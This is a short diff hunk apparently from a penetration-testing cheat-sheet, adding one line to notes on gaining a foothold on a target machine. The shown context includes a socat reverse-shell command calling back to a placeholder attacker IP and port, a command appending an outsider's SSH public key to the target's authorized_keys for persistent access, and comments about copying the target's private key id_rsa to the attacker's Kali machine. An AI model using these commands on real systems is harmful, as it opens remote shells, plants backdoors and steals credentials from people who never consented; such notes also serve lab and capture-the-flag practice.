@@ -25,6 +25,7 @@ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid
 # in target
 mkdir -p ~/.ssh/
 ssh-keygen
+cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> ~/.ssh/authorized_keys
 # transfer id_rsa target file to our kali 
 # in our kali 
